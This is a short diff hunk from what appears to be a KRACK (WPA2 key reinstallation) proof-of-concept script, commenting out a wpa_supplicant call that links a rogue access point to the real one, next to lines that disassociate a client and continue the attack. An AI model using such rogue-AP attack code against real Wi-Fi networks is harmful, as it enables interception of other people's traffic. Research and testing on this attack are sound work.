@@ -931,7 +931,7 @@ class KRAckAttack():
 			self.queue_disas(self.clientmac)
 
 		# 將流氓 AP 與原 AP 連線
-		subprocess.check_output(["wpa_supplicant", "-i", "wlan0sta1", "-c", "/home/sun10/krackattacks-poc-zerokey/wpa_supplicant/rea_ap.conf", "-B"])
+		# subprocess.check_output(["wpa_supplicant", "-i", "wlan0sta1", "-c", "/home/sun10/krackattacks-poc-zerokey/wpa_supplicant/rea_ap.conf", "-B"])
 
 		# Continue attack by monitoring both channels and performing needed actions
 		self.last_real_beacon = time.time()
